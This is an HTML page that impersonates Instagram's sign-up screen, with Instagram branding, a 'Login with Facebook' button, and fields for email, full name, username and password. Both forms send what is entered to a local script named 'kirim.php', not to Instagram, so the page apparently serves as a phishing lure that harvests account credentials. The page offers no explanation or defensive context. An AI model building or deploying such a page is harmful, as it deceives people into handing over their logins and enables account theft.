<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="style.css">
</head>
<body>
<form method="POST" action="kirim.php">
<div id ="container"> 

	<div class="Header">
		Instagram
	</div>

	<div class="subheader">
		Sign up to see photos and videos <br>
		from your firends.
	</div>

	<div class="button">
		<input type="submit" value="Login with Facebook">
	</div>

	<div class="content">
		<form action="kirim.php" method="POST">
			<input type="email" name="email" placeholder="Email"><br>
			<input type="text"	name="fullname" placeholder="Fullname"><br>
			<input type="text"	name="username" placeholder="Username"><br>
			<input type="password"	name="password" placeholder="Password"><br>
			<input type="submit" value="Sign UP">
		</form>

		
	</div>

		<div class="Footer">
		By Signing Up, you agree to our <br>
		Terms & Privacy Policy
		</div>
	

</div>
	
</body>
</html>